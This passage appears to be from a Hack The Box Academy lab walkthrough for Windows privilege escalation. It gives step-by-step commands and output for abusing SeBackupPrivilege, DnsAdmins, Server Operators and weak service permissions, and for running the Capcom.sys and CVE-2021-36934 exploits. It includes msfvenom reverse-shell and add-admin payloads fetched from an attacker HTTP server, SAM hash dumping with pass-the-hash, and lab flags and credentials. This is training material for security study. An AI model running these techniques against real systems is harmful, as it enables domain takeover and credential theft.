----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

From the output, students will notice that the `SeBackupPrivilege` has the `Disabled` state.

Afterward, students need to navigate to `C:\Tools`, and then import the `SeBackupPrivilegeUtils` and `SeBackupPrivilegeCmdlets` `PowerShell` modules:

Code: powershell

```powershell
cd C:\tools
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdlets.dll
```

```powershell-session
PS C:\Users\svc_backup> cd C:\tools
PS C:\tools> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\tools> Import-Module .\SeBackupPrivilegeUtils.dll
```

Students now need to enable the `SeBackupPrivilege` privilege using `Set-SeBackupPrivilege`:

Code: powershell

```powershell
Set-SeBackupPrivilege
```

```powershell-session
PS C:\tools> Set-SeBackupPrivilege
PS C:\tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Now that the `SeBackupPrivilege` privilege has been `Enabled`, students should be able to see the flag located at `C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`:

Code: powershell

```powershell
dir C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
```

```powershell-session
PS C:\tools> dir C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt

Directory: C:\Users\Administrator\Desktop\SeBackupPrivilege


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2021  11:42 AM             30 flag.txt
```

At last, students need to copy the flag to the working directory using the `Copy-FileSeBackupPrivilege` `Cmdlet`:

Code: powershell

```powershell
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' flag.txt
```

```powershell-session
PS C:\tools> Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' flag.txt

Copied 30 bytes
```

Students can now read the contents of the flag file "flag.txt", to find it to be `Car3ful_w1th_gr0up_m3mberSh1p!`:

Code: powershell

```powershell
cat flag.txt
```

```powershell-session
PS C:\tools> cat flag.txt

Car3ful_w1th_gr0up_m3mberSh1p!
```

Answer: `Car3ful_w1th_gr0up_m3mberSh1p!`

# Event Log Readers

## Question 1

### "Using the methods demonstrated in this section find the password for the user mary."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `logger:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:logger /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.95.119 /u:logger /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Students then need to open PowerShell and check to see which users are in the `Event Log Readers` group:

Code: powershell

```powershell
net localgroup "Event Log Readers"
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\logger> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members
-------------------------------------------------------------------------------
logger
The command completed successfully.
```

At last, students need to list security logs containing the string `/user` using `wevtutil`:

Code: powershell

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```powershell-session
PS C:\Users\logger> wevtutil qe Security /rd:true /f:text | Select-String "/user"

	Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
	Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2021!
	Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

From the output of the command, students will know that the password for the `mary` user is `W1ntergreen_gum_2021!`.

Answer: `W1ntergreen_gum_2021!`

# DnsAdmins

## Question 1

### "Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at C:\\Users\\Administrator\\Desktop\\DnsAdmins\\flag.txt"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `netadm:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:netadm /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

From Pwnbox/`PMVPN`, students need to prepare a malicious `.dll` file using `msfvenom` that will execute the command `net group "domain admins" netadm /add /domain`:

Code: shell

```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 8704 bytes
Saved as: adduser.dll
```

Then, students need to start a Python HTTP server Pwnbox/`PMVPN` so that the `adduser.dll` file can be delivered to the Windows target:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
```

From the established RDP session, students need to open PowerShell and download the `adduser.dll` file using `wget`:

Code: powershell

```powershell
wget "http://PWNIP:PWNPO/adduser.dll" -outfile "adduser.dll"
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\netadm> wget "http://10.10.14.80:7777/adduser.dll" -outfile "adduser.dll"
PS C:\Users\netadm> ls

	Directory: C:\Users\netadm
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
						<SNIP>
d-r---        5/19/2021   1:38 PM                Videos
-a----        10/3/2022   9:03 AM           8704 adduser.dll
```

Students then need to open Command Prompt and load the malicious `.dll`:

Code: cmd

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
```

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\netadm>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Then, from the same Command Prompt, students need to restart the `DNS` service:

Code: cmd

```cmd
sc stop dns
sc start dns
```

```cmd-session
C:\Users\netadm>sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530

C:\Users\netadm>sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
							(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6460
        FLAGS              :
```

Subsequently, students need to verify that the `netadm` user is now part of the `Domain Admins` group:

Code: cmd

```cmd
net group "Domain Admins" /dom
```

```cmd-session
C:\Users\netadm>net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

Students then need to sign out:

![Windows_Privilege_Escalation_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_8.png)

Afterward, students need to reconnect back to the Windows target using `xfreerdp` with the credentials `netadm:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:netadm /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.42 /u:netadm /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

At last, students need to open Command Prompt and print the flag file "flag.txt", which is under the `C:\Users\Administrator\Desktop\DnsAdmins\` directory:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt
```

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\netadm>type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt

Dll_abus3_ftw!
```

Answer: `Dll_abus3_ftw!`

# Print Operators

## Question 1

### "Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\\Tools directory, or you can practice compiling and uploading them on your own."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `printsvc:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:printsvc /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open Command Prompt and run it as administrator (supplying the credentials `printsvc:HTB_@cademy_stdnt!` when prompted to):

![Windows_Privilege_Escalation_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_9.png)

Subsequently, students need to navigate to the `C:\Tools` directory and run `EoPLoadDriver.exe` to enable the `SeLoadDriverPrivilege` privilege, create the registry key, and execute the `NTLoadDriver`:

Code: cmd

```cmd
cd C:\Tools
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools

C:\Tools>EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
RegCreateKeyEx failed: 0x0
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: 00000000, WinError: 0
```

Students then need to navigate to the `\ExploitCapcom\` directory and execute `ExploitCapcom.exe`:

Code: cmd

```cmd
cd \ExploitCapcom
ExploitCapcom.exe
```

```cmd-session
C:\Tools>cd ExploitCapcom
C:\Tools\ExploitCapcom>ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 0000016476420008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

This will launch a Command Prompt with system privileges, thus, students can now read the flag file "flag.txt" under the directory `C:\Users\Administrator\Desktop`, which is `Pr1nt_0p3rat0rs_ftw!`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

![Windows_Privilege_Escalation_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_10.png)

Answer: `Pr1nt_0p3rat0rs_ftw!`

# Server Operators

## Question 1

### "Escalate privileges using the methods shown in this section and submit the contents of the flag located at C:\\Users\\Administrator\\Desktop\\ServerOperators\\flag.txt"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `server_adm:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:server_adm /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open Command Prompt and query the `AppReadiness` service using the `sc` utility:

Code: cmd

```cmd
sc qc Appreadiness
```

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\server_adm>sc qc Appreadiness
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Appreadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Students then need to check service permissions with `PsService.exe` (found within the `C:\Tools\` directory):

Code: cmd

```cmd
C:\Tools\PsService.exe security AppReadiness
```

```cmd-session
C:\Users\server_adm>C:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE

<SNIP>
```

Moreover, students need to check for `Local Admin Group` Membership:

Code: cmd

```cmd
net localgroup administrators
```

```cmd-session
C:\Users\server_adm>net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

Subsequently, students need to modify the service path binary:

Code: cmd

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

```cmd-session
C:\Users\server_adm>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

And then, students need to start the `AppReadiness` service:

Code: cmd

```cmd
sc start AppReadiness
```

```cmd-session
C:\Users\server_adm>sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Students will notice that the service fails, but this is intended. Thereafter, students need to confirm that the `server_adm` user has been added to the local Administrators group:

Code: cmd

```cmd
net localgroup Administrators
```

```cmd-session
C:\Users\server_adm>net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

Now that the `server_adm` user has local Administrator rights, students need to sign out:

![Windows_Privilege_Escalation_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_11.png)

Afterward, students need to connect back to the Windows target using `xfreerdp` with the credentials `printsvc:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:printsvc /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

At last, students need to print the flag file "flag.txt" which is under the directory `C:\Users\Administrator\Desktop\ServerOperators\`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\server_adm>type C:\Users\Administrator\Desktop\ServerOperators\flag.txt

S3rver_0perators_@ll_p0werfull!
```

Answer: `S3rver_0perators_@ll_p0werfull!`

# User Account Control

## Question 1

### "Follow the steps in this section to obtain a reverse shell connection with normal user privileges and another which bypasses UAC. Submit the contents of flag.txt on the sarah user's Desktop when finished."

(Students are highly encouraged to practice the techniques shown in the section). When ready to move on, students will connect to the Windows target using `xfreerdp` with the credentials `sarah:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:sarah /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.16 /u:sarah /p:HTB_@cademy_stdnt!

[19:32:22:165] [4839:4840] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[19:32:22:165] [4839:4840] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[19:32:22:165] [4839:4840] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Subsequently, students will be able to read the flag file "flag.txt", found in the Desktop directory:

![Windows_Privilege_Escalation_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_12.png)

Answer: `I_bypass3d_Uac!`

# Weak Permissions

## Question 1

### "Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.243.192 /u:htb-student /p:HTB_@cademy_stdnt!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once connected, students need to open Command Prompt, navigate to the `C:\Tools` directory, and run `SharpUp`:

Code: cmd

```cmd
SharpUp.exe audit
```

```cmd-session
C:\Tools>SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

This reveals two executables that can be modified, `WindscribeService.exe` and `SecurityService.exe`.

From Pwnbox/`PMVPN`, students need to generate a malicious `.exe` file using `msfvenom`:

Code: shell

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe > SecurityService.exe
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=4444 -f exe > SecurityService.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

Students then need to start a Python HTTP server:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

From the prior Command Prompt, students need to download the malicious `.exe` file to the Windows machine using `certutil.exe`:

Code: cmd

```cmd
certutil.exe -f -urlcache http://PWNIP:PWNPO/SecurityService.exe SecurityService.exe
```

```cmd-session
C:\Tools>certutil.exe -f -urlcache http://10.10.14.80:8080/SecurityService.exe SecurityService.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Subsequently, students need to start an `nc` listener on Pwnbox/`PMVPN`, using the same port that was specified for the malicious `SecurityService.exe` executable generated by `msfvenom`:

Code: shell

```shell
nc -lvnp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 4444

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

On the Windows machine, students need to replace the original file `C:\Program Files (x86)\PCProtect\SecurityService.exe` with the malicious executable generated by `msfvenom` and then start the service:

Code: cmd

```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

```cmd-session
C:\Tools>cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
	
	1 file(s) copied.

C:\Tools>sc start SecurityService
```

Students will notice that the reverse shell session has been established successfully in the `nc` listener:

```shell-session
Ncat: Connection from 10.129.243.192.
Ncat: Connection from 10.129.243.192:51465.
Microsoft Windows [Version 10.0.19042.985]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32
```

At last, students can read the flag file "flag.txt" located at `C:\Users\Administrator\Desktop\WeakPerms\`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\WeakPerms\flag.txt
```

```cmd-session
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\WeakPerms\flag.txt

Aud1t_th0se_s3rv1ce_p3rms!
```

Answer: `Aud1t_th0se_s3rv1ce_p3rms!`

# Kernel Exploits

## Question 1

### "Try out the 3 examples in this section to escalate privileges to NT AUTHORITY\\SYSTEM on the target host. Submit the contents of the flag on the Administrator Desktop."

Students are highly encouraged to try out all 3 `CVE` examples to escalate privileges. In here, only `CVE-2021-36934` will be exploited.

First, students need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.13 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Subsequently, students then need to open PowerShell, navigate to the `C:\Tools` directory and run `CVE-2021-36934.exe`:

Code: shell

```shell
cd C:\Tools\
.\CVE-2021-36934.exe
```

```powershell-session
PS C:\Tools> .\CVE-2021-36934.exe

[*] SAM: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\sam
[*] SYSTEM: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system
[*] SECURITY: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\security
[*] Copying files to C:\windows\temp\
[*] SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54

<SNIP>
```

Students should copy the second part of the `NTLM` hash for the Administrator user (i.e., `7796ee39fd3a9c3a1844556115ae1a54`) as they will need it to authenticate to SMB:

Code: shell

```shell
smbclient -U administrator '\\PWNIP\C$' --pw-nt-hash
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ smbclient -U administrator '\\10.129.43.13\C$' --pw-nt-hash

Enter WORKGROUP\administrator's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

Students can now retrieve the flag located at `Users\Administrator\Desktop\flag.txt` using `get` and then, exit:

Code: shell

```shell
get Users\Administrator\Desktop\flag.txt
exit
```

```shell-session
smb: \> get Users\Administrator\Desktop\flag.txt

getting file \Users\Administrator\Desktop\flag.txt of size 29 as Users\Administrator\Desktop\flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

At last, students can read the contents of the flag file "flag.txt", specifying the same path as the SMB share:

Code: shell

```shell
cat 'Users\Administrator\Desktop\flag.txt'
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ cat 'Users\Administrator\Desktop\flag.txt'

D0nt_fall_b3h1nd_0n_Patch1ng!
```

Answer: `D0nt_fall_b3h1nd_0n_Patch1ng!`

# Vulnerable Services

## Question 1

### "Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulnServices folder on the Administrator Desktop."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open PowerShell and use `netstat` to find the process id of the `Druva inSync` service listening on port 6064:

Code: powershell

```powershell
netstat -ano | findstr 6064
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\htb-student> netstat -ano | findstr 6064
  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3416
  TCP    127.0.0.1:6064         127.0.0.1:55619        ESTABLISHED     3416
  TCP    127.0.0.1:55619        127.0.0.1:6064         ESTABLISHED     3984
  TCP    127.0.0.1:62905        127.0.0.1:6064         TIME_WAIT       0
  TCP    127.0.0.1:62906        127.0.0.1:6064         TIME_WAIT       0
```

Students will find the process number associated with `Druva inSync`, and then run `get-process` with the process id accordingly (3416 in here):

Code: powershell

```powershell
get-process -Id PID
```

```powershell-session
PS C:\Users\htb-student> get-process -id 3416

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
